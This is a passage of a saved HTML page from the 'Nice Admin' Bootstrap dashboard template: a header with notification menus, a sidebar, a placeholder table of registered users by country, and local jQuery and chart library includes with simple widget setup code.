            background: url("data:image/png,%89PNG%0D%0A%1A%0A%00%00%00%0DIHDR%00%00%00%0E%00%00%13%88%08%02%00%00%00%0E%F5%CB%10%00%00%00%04gAMA%00%00%D6%D8%D4OX2%00%00%00%19tEXtSoftware%00Adobe%20ImageReadyq%C9e%3C%00%00%06~IDATx%DA%EC%DD%D1v%A20%14%40Qt%F1%FF%FF%E4%97%D9%07%3BT%19%92%DC%40(%90%EEy%9A5%CB%B6%E8%F6%9Ac%A4%CC0%84%FF%DC%9E%CF%E7%E3%F1%88%DE4%F8%5D%C7%9F%2F%BA%DD%5E%7FI%7D%F18%DDn%BA%C5%FB%DF%97%BFk%F2%10%FF%FD%B4%F2M%A7%FB%FD%FD%B3%22%07p%8F%3F%AE%E3%F4S%8A%8F%40%EEq%9D%BE8D%F0%0EY%A1Uq%B7%EA%1F%81%88V%E8X%3F%B4%CEy%B7h%D1%A2E%EBohU%FC%D9%AF2fO%8BBeD%BE%F7X%0C%97%A4%D6b7%2Ck%A5%12%E3%9B%60v%B7r%C7%1AI%8C%BD%2B%23r%00c0%B2v%9B%AD%CA%26%0C%1Ek%05A%FD%93%D0%2B%A1u%8B%16-%95q%5Ce%DCSO%8E%E4M%23%8B%F7%C2%FE%40%BB%BD%8C%FC%8A%B5V%EBu%40%F9%3B%A72%FA%AE%8C%D4%01%CC%B5%DA%13%9CB%AB%E2I%18%24%B0n%A9%0CZ*Ce%9C%A22%8E%D8NJ%1E%EB%FF%8F%AE%CAP%19*%C3%BAEKe%AC%D1%AAX%8C*%DEH%8F%C5W%A1e%AD%D4%B7%5C%5B%19%C5%DB%0D%EF%9F%19%1D%7B%5E%86%BD%0C%95%A12%AC%5B*%83%96%CAP%19%F62T%86%CAP%19*%83%96%CA%B8Xe%BC%FE)T%19%A1%17xg%7F%DA%CBP%19*%C3%BA%A52T%86%CAP%19%F62T%86%CA%B0n%A9%0CZ%1DV%C6%3D%F3%FCH%DE%B4%B8~%7F%5CZc%F1%D6%1F%AF%84%F9%0F6%E6%EBVt9%0E~%BEr%AF%23%B0%97%A12T%86%CAP%19%B4T%86%CA%B8Re%D8%CBP%19*%C3%BA%A52huX%19%AE%CA%E5%BC%0C%7B%19*CeX%B7h%A9%0C%95%E1%BC%0C%7B%19*CeX%B7T%06%AD%CB%5E%95%2B%BF.%8F%C5%97%D5%E4%7B%EE%82%D6%FB%CF-%9C%FD%B9%CF%3By%7B%19%F62T%86%CA%B0n%D1R%19*%A3%D3%CA%B0%97%A12T%86uKe%D0%EA%B02*%3F1%99%5DB%2B%A4%B5%F8%3A%7C%BA%2B%8Co%7D%5C%EDe%A8%0C%95a%DDR%19%B4T%C66%82fA%B2%ED%DA%9FC%FC%17GZ%06%C9%E1%B3%E5%2C%1A%9FoiB%EB%96%CA%A0%D5qe4%7B%7D%FD%85%F7%5B%ED_%E0s%07%F0k%951%ECr%0D%B5C%D7-g%D1%A8%0C%EB%96%CA%A0%A52T%C6)*%C3%5E%86%CAP%19%D6-%95A%EB*%95q%F8%BB%E3%F9%AB%F6%E21%ACZ%B7%22%B7%9B%3F%02%85%CB%A2%5B%B7%BA%5E%B7%9C%97%E1%BC%0C%EB%16-%95%A12z%AC%0C%BFc%A22T%86uKe%D0%EA%B02V%DD%AD%8A%2B%8CWhe%5E%AF%CF%F5%3B%26%CE%CBh%5C%19%CE%CB%B0%F3%A4%095%A1%CAP%19*Ce%A8%0C%3BO*Ce%A8%0C%95%A12%3A%AD%8C%0A%82%7B%F0v%1F%2FD%A9%5B%9F%EE%EA%26%AF%03%CA%DF9%7B%19*Ce%A8%0C%95%A12T%86%CA%B8Ze%D8%CBP%19*Ce%A8%0C%95%D1ae%EC%F7%89I%E1%B4%D7M%D7P%8BjU%5C%BB%3E%F2%20%D8%CBP%19*Ce%A8%0C%95%A12T%C6%D5*%C3%5E%86%CAP%19*Ce%B4O%07%7B%F0W%7Bw%1C%7C%1A%8C%B3%3B%D1%EE%AA%5C%D6-%EBV%83%80%5E%D0%CA%10%5CU%2BD%E07YU%86%CAP%19*%E3%9A%95%91%D9%A0%C8%AD%5B%EDv%9E%82%FFKOee%E4%8FUe%A8%0C%95%A12T%C6%1F%A9%8C%C8%3D%5B%A5%15%FD%14%22r%E7B%9F%17l%F8%BF%ED%EAf%2B%7F%CF%ECe%D8%CBP%19*Ce%A8%0C%95%E1%93~%7B%19%F62T%86%CAP%19*Ce%A8%0C%E7%13%DA%CBP%19*Ce%A8%0CZf%8B%16-Z%B4h%D1R%19f%8B%16-Z%B4h%D1R%19%B4%CC%16-Z%B4h%D1R%19%B4%CC%16-Z%B4h%D1%A2%A52%CC%16-Z%B4h%D1%A2%A52h%99-Z%B4h%D1%A2%A52h%99-Z%B4h%D1%A2EKe%98-Z%B4h%D1%A2EKe%D02%5B%B4h%D1%A2EKe%D02%5B%B4h%D1%A2E%8B%96%CA0%5B%B4h%D1%A2E%8B%96%CA%A0e%B6h%D1%A2E%8B%96%CA%A0e%B6h%D1%A2E%8B%16-%95a%B6h%D1%A2E%8B%16-%95A%CBl%D1%A2E%8B%16-%95A%CBl%D1%A2E%8B%16-Z*%C3l%D1%A2E%8B%16-Z*%83%96%D9%A2E%8B%16-Z*%83%96%D9%A2E%8B%16-Z%B4T%86%D9%A2E%8B%16-Z%B4T%06-%B3E%8B%16-Z%B4T%06-%B3E%8B%16-Z%B4h%A9%0C%B3E%8B%16-Z%B4h%A9%0CZf%8B%16-Z%B4h%A9%0CZf%8B%16-Z%B4h%D1R%19f%8B%16-Z%B4h%D1R%19%B4%CC%16-Z%B4h%D1R%19%B4%CC%16-Z%B4h%D1%A2%A52%CC%16-Z%B4h%D1%A2%A52h%99-Z%B4h%D1%A2%A52h%99-Z%B4h%D1%A2EKe%98-Z%B4h%D1%A2EKe%D02%5B%B4h%D1%A2EKe%D02%5B%B4h%D1%A2E%8B%96%CA0%5B%B4h%D1%A2E%8B%96%CA%A0e%B6h%D1%A2E%8B%96%CA%A0e%B6h%D1%A2E%8B%16-%95a%B6h%D1%A2E%8B%16-%95A%CBl%D1%A2E%8B%16-%95A%CBl%D1%A2E%8B%16-Z*%C3l%D1%A2E%8B%16-Z*%83%96%D9%A2E%8B%16-Z*%83%96%D9%A2E%8B%16-Z%B4T%86%D9%A2E%8B%16-Z%B4T%06-%B3E%8B%16-Z%B4T%06-%B3E%8B%16-Z%B4h%A9%0C%B3E%8B%16-Z%B4h%A9%0CZf%8B%16-Z%B4h%A9%0CZf%8B%16-Z%B4h%D1R%19f%8B%16-Z%B4h%D1R%19%B4%CC%16-Z%B4h%D1R%19%B4%CC%16-Z%B4h%D1%A2%A52%CC%16-Z%B4h%D1%A2%A52h%99-Z%B4h%D1%A2%A52h%99-Z%B4h%D1%A2EKe%98-Z%B4h%D1%A2EKe%D02%5B%B4h%D1%A2EKe%D02%5B%B4h%D1%A2E%8B%96%CA0%5B%B4h%D1%A2E%8B%96%CA%A0e%B6h%D1%A2E%8B%96%CA%A0e%B6h%D1%A2E%8B%16-%95a%B6h%D1%A2E%8B%16-%95A%CBl%D1%A2E%8B%16-%95A%CBl%D1%A2E%8B%16-Z*%C3l%D1%A2E%8B%16-Z*%83%96%D9%A2E%8B%16-Z*%83%96%D9%A2E%8B%16-Z%B4T%86%D9%A2E%8B%16-Z%B4T%06-%B3E%8B%16-Z%B4%AE%A4%F5%25%C0%00%DE%BF%5C'%0F%DA%B8q%00%00%00%00IEND%AEB%60%82") repeat-y !important;
            border-left: 1px solid #BBBBBB !important;
            border-right: 1px solid #000000 !important;
            border-bottom: 1px dashed #BBBBBB !important;
        }

        .overflowRulerX > .firebugRulerV {
            left: 0 !important;
        }

        .overflowRulerY > .firebugRulerH {
            top: 0 !important;
        }

        /* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
        .fbProxyElement {
            position: fixed !important;
            pointer-events: auto !important;
        }
    </style></head>

<body s1631384958982904955="1" jhjlijpomuhn_m="l">
    <!-- container section start -->
    <section id="container" class="">


        <header class="header dark-bg">
            <div class="toggle-nav">
                <div class="icon-reorder tooltips" data-original-title="Toggle Navigation" data-placement="bottom"></div>
            </div>

            <!--logo start-->
            <a href="index.html" class="logo">Nice <span class="lite">Admin</span></a>
            <!--logo end-->

            <div class="nav search-row" id="top_menu">
                <!--  search form start -->
                <ul class="nav top-menu">                    
                    <li>
                        <form class="navbar-form">
                            <input class="form-control" placeholder="Search" type="text">
                        </form>
                    </li>                    
                </ul>
                <!--  search form end -->                
            </div>

            <div class="top-nav notification-row">                
                <!-- notificatoin dropdown start-->
                <ul class="nav pull-right top-menu">

                    <!-- task notificatoin start -->
                    <li id="task_notificatoin_bar" class="dropdown">
                        <a data-toggle="dropdown" class="dropdown-toggle" href="#">
                            <span class="icon-task-l">
                                <span class="badge bg-important">6</span>
                            </span></a>
                        <ul class="dropdown-menu extended tasks-bar">
                            <div class="notify-arrow notify-arrow-blue"></div>
                            <li>
                                <p class="blue">You have 6 pending letter</p>
                            </li>
                            <li>
                                <a href="#">
                                    <div class="task-info">
                                        <div class="desc">Design PSD </div>
                                        <div class="percent">90%</div>
                                    </div>
                                    <div class="progress progress-striped">
                                        <div class="progress-bar progress-bar-success" role="progressbar" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100" style="width: 90%">
                                            <span class="sr-only">90% Complete (success)</span>
                                        </div>
                                    </div>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <div class="task-info">
                                        <div class="desc">
                                            Project 1
                                        </div>
                                        <div class="percent">30%</div>
                                    </div>
                                    <div class="progress progress-striped">
                                        <div class="progress-bar progress-bar-warning" role="progressbar" aria-valuenow="30" aria-valuemin="0" aria-valuemax="100" style="width: 30%">
                                            <span class="sr-only">30% Complete (warning)</span>
                                        </div>
                                    </div>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <div class="task-info">
                                        <div class="desc">Digital Marketing</div>
                                        <div class="percent">80%</div>
                                    </div>
                                    <div class="progress progress-striped">
                                        <div class="progress-bar progress-bar-info" role="progressbar" aria-valuenow="80" aria-valuemin="0" aria-valuemax="100" style="width: 80%">
                                            <span class="sr-only">80% Complete</span>
                                        </div>
                                    </div>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <div class="task-info">
                                        <div class="desc">Logo Designing</div>
                                        <div class="percent">78%</div>
                                    </div>
                                    <div class="progress progress-striped">
                                        <div class="progress-bar progress-bar-danger" role="progressbar" aria-valuenow="78" aria-valuemin="0" aria-valuemax="100" style="width: 78%">
                                            <span class="sr-only">78% Complete (danger)</span>
                                        </div>
                                    </div>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <div class="task-info">
                                        <div class="desc">Mobile App</div>
                                        <div class="percent">50%</div>
                                    </div>
                                    <div class="progress progress-striped active">
                                        <div class="progress-bar" role="progressbar" aria-valuenow="50" aria-valuemin="0" aria-valuemax="100" style="width: 50%">
                                            <span class="sr-only">50% Complete</span>
                                        </div>
                                    </div>

                                </a>
                            </li>
                            <li class="external">
                                <a href="#">See All Tasks</a>
                            </li>
                        </ul>
                    </li>
                    <!-- task notificatoin end -->
                    <!-- inbox notificatoin start-->
                    <li id="mail_notificatoin_bar" class="dropdown">
                        <a data-toggle="dropdown" class="dropdown-toggle" href="#">
                            <i class="icon-envelope-l"></i>
                            <span class="badge bg-important">5</span>
                        </a>
                        <ul class="dropdown-menu extended inbox">
                            <div class="notify-arrow notify-arrow-blue"></div>
                            <li>
                                <p class="blue">You have 5 new messages</p>
                            </li>
                            <li>
                                <a href="#">
                                    <span class="photo"><img alt="avatar" src="./img/avatar-mini.jpg"></span>
                                    <span class="subject">
                                        <span class="from">Greg  Martin</span>
                                        <span class="time">1 min</span>
                                    </span>
                                    <span class="message">
                                        I really like this admin panel.
                                    </span>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <span class="photo"><img alt="avatar" src="./img/avatar-mini2.jpg"></span>
                                    <span class="subject">
                                        <span class="from">Bob   Mckenzie</span>
                                        <span class="time">5 mins</span>
                                    </span>
                                    <span class="message">
                                        Hi, What is next project plan?
                                    </span>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <span class="photo"><img alt="avatar" src="./img/avatar-mini3.jpg"></span>
                                    <span class="subject">
                                        <span class="from">Phillip   Park</span>
                                        <span class="time">2 hrs</span>
                                    </span>
                                    <span class="message">
                                        I am like to buy this Admin Template.
                                    </span>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <span class="photo"><img alt="avatar" src="./img/avatar-mini4.jpg"></span>
                                    <span class="subject">
                                        <span class="from">Ray   Munoz</span>
                                        <span class="time">1 day</span>
                                    </span>
                                    <span class="message">
                                        Icon fonts are great.
                                    </span>
                                </a>
                            </li>
                            <li>
                                <a href="#">See all messages</a>
                            </li>
                        </ul>
                    </li>
                    <!-- inbox notificatoin end -->
                    <!-- alert notification start-->
                    <li id="alert_notificatoin_bar" class="dropdown">
                        <a data-toggle="dropdown" class="dropdown-toggle" href="#">

                            <i class="icon-bell-l"></i>
                            <span class="badge bg-important">7</span>
                        </a>
                        <ul class="dropdown-menu extended notification">
                            <div class="notify-arrow notify-arrow-blue"></div>
                            <li>
                                <p class="blue">You have 4 new notifications</p>
                            </li>
                            <li>
                                <a href="#">
                                    <span class="label label-primary"><i class="icon_profile"></i></span> 
                                    Friend Request
                                    <span class="small italic pull-right">5 mins</span>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <span class="label label-warning"><i class="icon_pin"></i></span>  
                                    John location.
                                    <span class="small italic pull-right">50 mins</span>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <span class="label label-danger"><i class="icon_book_alt"></i></span> 
                                    Project 3 Completed.
                                    <span class="small italic pull-right">1 hr</span>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <span class="label label-success"><i class="icon_like"></i></span> 
                                    Mick appreciated your work.
                                    <span class="small italic pull-right"> Today</span>
                                </a>
                            </li>                            
                            <li>
                                <a href="#">See all notifications</a>
                            </li>
                        </ul>
                    </li>
                    <!-- alert notification end-->
                    <!-- user login dropdown start-->
                    <li class="dropdown">
                        <a data-toggle="dropdown" class="dropdown-toggle" href="#">
                            <span class="profile-ava">
                                <img alt="" src="img/avatar1_small.jpg">
                            </span>
                            <span class="username">Jenifer Smith</span>
                            <b class="caret"></b>
                        </a>
                        <ul class="dropdown-menu extended logout">
                            <div class="log-arrow-up"></div>
                            <li class="eborder-top">
                                <a href="#"><i class="icon_profile"></i> My Profile</a>
                            </li>
                            <li>
                                <a href="#"><i class="icon_mail_alt"></i> My Inbox</a>
                            </li>
                            <li>
                                <a href="#"><i class="icon_clock_alt"></i> Timeline</a>
                            </li>
                            <li>
                                <a href="#"><i class="icon_chat_alt"></i> Chats</a>
                            </li>
                            <li>
                                <a href="login.html"><i class="icon_key_alt"></i> Log Out</a>
                            </li>
                            <li>
                                <a href="documentation.html"><i class="icon_key_alt"></i> Documentation</a>
                            </li>
                            <li>
                                <a href="documentation.html"><i class="icon_key_alt"></i> Documentation</a>
                            </li>
                        </ul>
                    </li>
                    <!-- user login dropdown end -->
                </ul>
                <!-- notificatoin dropdown end-->
            </div>
        </header>      
        <!--header end-->

        <!--sidebar start-->
        <aside>
            <div tabindex="5000" style="overflow: hidden;" id="sidebar" class="nav-collapse ">
                <!-- sidebar menu start-->
                <ul class="sidebar-menu">                
                    <li class="active">
                        <a class="" href="index.html">
                            <i class="icon_house_alt"></i>
                            <span>Dashboard</span>
                        </a>
                    </li>
                    <li class="sub-menu">
                        <a href="javascript:;" class="">
                            <i class="icon_document_alt"></i>
                            <span>Forms</span>
                            <span class="menu-arrow arrow_carrot-right"></span>
                        </a>
                        <ul class="sub">
                            <li><a class="" href="form_component.html">Form Elements</a></li>                          
                            <li><a class="" href="form_validation.html">Form Validation</a></li>
                        </ul>
                    </li>       
                    <li class="sub-menu">
                        <a href="javascript:;" class="">
                            <i class="icon_desktop"></i>
                            <span>UI Fitures</span>
                            <span class="menu-arrow arrow_carrot-right"></span>
                        </a>
                        <ul class="sub">
                            <li><a class="" href="general.html">Elements</a></li>
                            <li><a class="" href="buttons.html">Buttons</a></li>
                            <li><a class="" href="grids.html">Grids</a></li>
                        </ul>
                    </li>
                    <li>
                        <a class="" href="widgets.html">
                            <i class="icon_genius"></i>
                            <span>Widgets</span>
                        </a>
                    </li>
                    <li>                     
                        <a class="" href="chart-chartjs.html">
                            <i class="icon_piechart"></i>
                            <span>Charts</span>

                        </a>

                    </li>

                    <li class="sub-menu">
                        <a href="javascript:;" class="">
                            <i class="icon_table"></i>
                            <span>Tables</span>
                            <span class="menu-arrow arrow_carrot-right"></span>
                        </a>
                        <ul class="sub">
                            <li><a class="" href="basic_table.html">Basic Table</a></li>
                        </ul>
                    </li>

                    <li class="sub-menu">
                        <a href="javascript:;" class="">
                            <i class="icon_documents_alt"></i>
                            <span>Pages</span>
                            <span class="menu-arrow arrow_carrot-right"></span>
                        </a>
                        <ul class="sub">                          
                            <li><a class="" href="profile.html">Profile</a></li>
                            <li><a class="" href="login.html"><span>Login Page</span></a></li>
                            <li><a class="" href="blank.html">Blank Page</a></li>
                            <li><a class="" href="404.html">404 Error</a></li>
                        </ul>
                    </li>

                </ul>
                <!-- sidebar menu end-->
            </div>
        </aside>
        <!--sidebar end-->

        <!--main content start-->
        <section id="main-content">
            <section class="wrapper">            
                <!--overview start-->
                <div class="row">
                    <div class="col-lg-12">
                        <h3 class="page-header"><i class="fa fa-laptop"></i> Dashboard</h3>
                        <ol class="breadcrumb">
                            <li><i class="fa fa-home"></i><a href="index.html">Home</a></li>
                            <li><i class="fa fa-laptop"></i>Dashboard</li>						  	
                        </ol>
                    </div>
                </div>

                <div class="row">
                    <!--/.col-->

                    <!--/.col-->	

                    <!--/.col-->

                    <!--/.col-->

                </div><!--/.row-->





                <!-- Today status end -->



                <div class="row">

                    <div class="col-lg-9 col-md-12">	
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h2><i class="fa fa-flag-o red"></i><strong>Registered Users</strong></h2>
                                <div class="panel-actions">
                                    <a href="index.html#" class="btn-setting"><i class="fa fa-rotate-right"></i></a>
                                    <a href="index.html#" class="btn-minimize"><i class="fa fa-chevron-up"></i></a>
                                    <a href="index.html#" class="btn-close"><i class="fa fa-times"></i></a>
                                </div>
                            </div>
                            <div class="panel-body">
                                <table class="table bootstrap-datatable countries">
                                    <thead>
                                        <tr>
                                            <th></th>
                                            <th>Country</th>
                                            <th>Users</th>
                                            <th>Online</th>
                                            <th>Performance</th>
                                        </tr>
                                    </thead>   
                                    <tbody>
                                        <tr>
                                            <td><img src="img/Germany.png" style="height:18px; margin-top:-2px;"></td>
                                            <td>Germany</td>
                                            <td>2563</td>
                                            <td>1025</td>
                                            <td>
                                                <div class="progress thin">
                                                    <div class="progress-bar progress-bar-danger" role="progressbar" aria-valuenow="73" aria-valuemin="0" aria-valuemax="100" style="width: 73%">
                                                    </div>
                                                    <div class="progress-bar progress-bar-warning" role="progressbar" aria-valuenow="27" aria-valuemin="0" aria-valuemax="100" style="width: 27%">
                                                    </div>
                                                </div>
                                                <span class="sr-only">73%</span>   	
                                            </td>
                                        </tr>
                                        <tr>
                                            <td><img src="img/India.png" style="height:18px; margin-top:-2px;"></td>
                                            <td>India</td>
                                            <td>3652</td>
                                            <td>2563</td>
                                            <td>
                                                <div class="progress thin">
                                                    <div class="progress-bar progress-bar-danger" role="progressbar" aria-valuenow="57" aria-valuemin="0" aria-valuemax="100" style="width: 57%">
                                                    </div>
                                                    <div class="progress-bar progress-bar-warning" role="progressbar" aria-valuenow="43" aria-valuemin="0" aria-valuemax="100" style="width: 43%">
                                                    </div>
                                                </div>
                                                <span class="sr-only">57%</span>   	
                                            </td>
                                        </tr>
                                        <tr>
                                            <td><img src="img/Spain.png" style="height:18px; margin-top:-2px;"></td>
                                            <td>Spain</td>
                                            <td>562</td>
                                            <td>452</td>
                                            <td>
                                                <div class="progress thin">
                                                    <div class="progress-bar progress-bar-danger" role="progressbar" aria-valuenow="93" aria-valuemin="0" aria-valuemax="100" style="width: 93%">
                                                    </div>
                                                    <div class="progress-bar progress-bar-warning" role="progressbar" aria-valuenow="7" aria-valuemin="0" aria-valuemax="100" style="width: 7%">
                                                    </div>
                                                </div>
                                                <span class="sr-only">93%</span>   	
                                            </td>
                                        </tr>
                                        <tr>
                                            <td><img src="img/India.png" style="height:18px; margin-top:-2px;"></td>
                                            <td>Russia</td>
                                            <td>1258</td>
                                            <td>958</td>
                                            <td>
                                                <div class="progress thin">
                                                    <div class="progress-bar progress-bar-danger" role="progressbar" aria-valuenow="20" aria-valuemin="0" aria-valuemax="100" style="width: 20%">
                                                    </div>
                                                    <div class="progress-bar progress-bar-warning" role="progressbar" aria-valuenow="80" aria-valuemin="0" aria-valuemax="100" style="width: 80%">
                                                    </div>
                                                </div>
                                                <span class="sr-only">20%</span>   	
                                            </td>
                                        </tr>
                                        <tr>
                                            <td><img src="img/Spain.png" style="height:18px; margin-top:-2px;"></td>
                                            <td>USA</td>
                                            <td>4856</td>
                                            <td>3621</td>
                                            <td>
                                                <div class="progress thin">
                                                    <div class="progress-bar progress-bar-danger" role="progressbar" aria-valuenow="20" aria-valuemin="0" aria-valuemax="100" style="width: 20%">
                                                    </div>
                                                    <div class="progress-bar progress-bar-warning" role="progressbar" aria-valuenow="80" aria-valuemin="0" aria-valuemax="100" style="width: 80%">
                                                    </div>
                                                </div>
                                                <span class="sr-only">20%</span>   	
                                            </td>
                                        </tr>
                                        <tr>
                                            <td><img src="img/Germany.png" style="height:18px; margin-top:-2px;"></td>
                                            <td>Brazil</td>
                                            <td>265</td>
                                            <td>102</td>
                                            <td>
                                                <div class="progress thin">
                                                    <div class="progress-bar progress-bar-danger" role="progressbar" aria-valuenow="20" aria-valuemin="0" aria-valuemax="100" style="width: 20%">
                                                    </div>
                                                    <div class="progress-bar progress-bar-warning" role="progressbar" aria-valuenow="80" aria-valuemin="0" aria-valuemax="100" style="width: 80%">
                                                    </div>
                                                </div>
                                                <span class="sr-only">20%</span>   	
                                            </td>
                                        </tr>
                                        <tr>
                                            <td><img src="img/Germany.png" style="height:18px; margin-top:-2px;"></td>
                                            <td>Coloumbia</td>
                                            <td>265</td>
                                            <td>102</td>
                                            <td>
                                                <div class="progress thin">
                                                    <div class="progress-bar progress-bar-danger" role="progressbar" aria-valuenow="20" aria-valuemin="0" aria-valuemax="100" style="width: 20%">
                                                    </div>
                                                    <div class="progress-bar progress-bar-warning" role="progressbar" aria-valuenow="80" aria-valuemin="0" aria-valuemax="100" style="width: 80%">
                                                    </div>
                                                </div>
                                                <span class="sr-only">20%</span>   	
                                            </td>
                                        </tr>
                                        <tr>
                                            <td><img src="img/Germany.png" style="height:18px; margin-top:-2px;"></td>
                                            <td>France</td>
                                            <td>265</td>
                                            <td>102</td>
                                            <td>
                                                <div class="progress thin">
                                                    <div class="progress-bar progress-bar-danger" role="progressbar" aria-valuenow="20" aria-valuemin="0" aria-valuemax="100" style="width: 20%">
                                                    </div>
                                                    <div class="progress-bar progress-bar-warning" role="progressbar" aria-valuenow="80" aria-valuemin="0" aria-valuemax="100" style="width: 80%">
                                                    </div>
                                                </div>
                                                <span class="sr-only">20%</span>   	
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>

                        </div>	

                    </div><!--/col-->

                    <!--/col-->
                    <!--/col-->

                </div>



                <!-- statics end -->




                <!-- project team & activity start -->



                <!-- project team & activity end -->

            </section>
        </section>
        <!--main content end-->
    </section>
    <!-- container section start -->

    <!-- javascripts -->
    <script src="js/jquery.js"></script>
    <script src="js/jquery-ui-1.10.4.min.js"></script>
    <script src="js/jquery-1.8.3.min.js"></script>
    <script type="text/javascript" src="js/jquery-ui-1.9.2.custom.min.js"></script>
    <!-- bootstrap -->
    <script src="js/bootstrap.min.js"></script>
    <!-- nice scroll -->
    <script src="js/jquery.scrollTo.min.js"></script>
    <script src="js/jquery.nicescroll.js" type="text/javascript"></script>
    <!-- charts scripts -->
    <script src="assets/jquery-knob/js/jquery.knob.js"></script>
    <script src="js/jquery.sparkline.js" type="text/javascript"></script>
    <script src="assets/jquery-easy-pie-chart/jquery.easy-pie-chart.js"></script>
    <script src="js/owl.carousel.js"></script>
    <!-- jQuery full calendar -->
    &lt;<script src="js/fullcalendar.min.js"></script> <!-- Full Google Calendar - Calendar -->
    <script src="assets/fullcalendar/fullcalendar/fullcalendar.js"></script>
    <!--script for this page only-->
    <script src="js/calendar-custom.js"></script>
    <script src="js/jquery.rateit.min.js"></script>
    <!-- custom select -->
    <script src="js/jquery.customSelect.min.js"></script>
    <script src="assets/chart-master/Chart.js"></script>

    <!--custome script for all page-->
    <script src="js/scripts.js"></script>
    <!-- custom script for this page-->
    <script src="js/sparkline-chart.js"></script>
    <script src="js/easy-pie-chart.js"></script>
    <script src="js/jquery-jvectormap-1.2.2.min.js"></script>
    <script src="js/jquery-jvectormap-world-mill-en.js"></script>
    <script src="js/xcharts.min.js"></script>
    <script src="js/jquery.autosize.min.js"></script>
    <script src="js/jquery.placeholder.min.js"></script>
    <script src="js/gdp-data.js"></script>	
    <script src="js/morris.min.js"></script>
    <script src="js/sparklines.js"></script>	
    <script src="js/charts.js"></script>
    <script src="js/jquery.slimscroll.min.js"></script>
    <script>

        //knob
        $(function () {
            $(".knob").knob({
                'draw': function () {
                    $(this.i).val(this.cv + '%')
                }
            })
        });

        //carousel
        $(document).ready(function () {
            $("#owl-slider").owlCarousel({
                navigation: true,
                slideSpeed: 300,
                paginationSpeed: 400,
                singleItem: true

            });
        });

        //custom select box

        $(function () {
            $('select.styled').customSelect();
        });

        /* ---------- Map ---------- */
        $(function () {
            $('#map').vectorMap({
                map: 'world_mill_en',
                series: {
                    regions: [{
                            values: gdpData,
                            scale: ['#000', '#000'],
                            normalizeFunction: 'polynomial'
                        }]
                },
                backgroundColor: '#eef3f7',
                onLabelShow: function (e, el, code) {
                    el.html(el.html() + ' (GDP - ' + gdpData[code] + ')');
                }
            });
        });



    </script>



    <div style="width: 6px; z-index: 1000; background: none repeat scroll 0% 0% rgb(247, 247, 247); cursor: default; position: fixed; top: 0px; height: 100%; right: 0px; opacity: 0;" class="nicescroll-rails" id="ascrail2000"><div style="position: relative; top: 0px; float: right; width: 6px; height: 440px; background-color: rgb(0, 122, 255); background-clip: padding-box; border-radius: 10px;"></div></div><div style="height: 6px; z-index: 1000; background: none repeat scroll 0% 0% rgb(247, 247, 247); position: fixed; left: 0px; width: 100%; bottom: 0px; cursor: default; display: none; opacity: 0;" class="nicescroll-rails" id="ascrail2000-hr"><div style="position: relative; top: 0px; height: 6px; width: 1366px; background-color: rgb(0, 122, 255); background-clip: padding-box; border-radius: 10px;"></div></div><div style="width: 3px; z-index: auto; background: none repeat scroll 0% 0% rgb(247, 247, 247); cursor: default; position: fixed; top: 0px; left: 177px; height: 608px; display: none; opacity: 0;" class="nicescroll-rails" id="ascrail2001"><div style="position: relative; top: 0px; float: right; width: 3px; height: 0px; background-color: rgb(0, 122, 255); background-clip: padding-box; border-radius: 10px;"></div></div><div style="height: 3px; z-index: auto; background: none repeat scroll 0% 0% rgb(247, 247, 247); top: 605px; left: 0px; position: fixed; cursor: default; display: none; opacity: 0;" class="nicescroll-rails" id="ascrail2001-hr"><div style="position: relative; top: 0px; height: 3px; width: 0px; background-color: rgb(0, 122, 255); background-clip: padding-box; border-radius: 10px; left: 0px;"></div></div><div style="display: none; left: 910px; top: 721px;" class="jvectormap-label">New Zealand</div><div style="display:none;" id="__fghjktghndfgt_once"></div><div style="display:none;" id="__if72ru4sdfsdfrkjahiuyi_once"></div><div style="display:none;" id="__hggasdgjhsagd_once"></div></body>